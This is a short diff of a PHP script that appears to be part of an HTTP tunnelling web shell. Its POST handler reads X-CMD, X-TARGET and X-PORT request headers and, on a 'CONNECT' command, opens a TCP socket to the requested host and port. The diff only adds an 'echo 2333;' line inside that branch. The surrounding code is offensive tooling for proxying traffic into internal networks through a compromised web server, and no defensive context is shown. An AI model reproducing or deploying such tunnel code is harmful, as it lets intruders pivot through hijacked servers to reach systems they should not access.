@@ -63,7 +63,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 	$cmd = $headers["X-CMD"];
     switch($cmd){
 		case "CONNECT":
-			{
+			{	echo 2333;
 				$target = $headers["X-TARGET"];
 				$port = (int)$headers["X-PORT"];
 				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
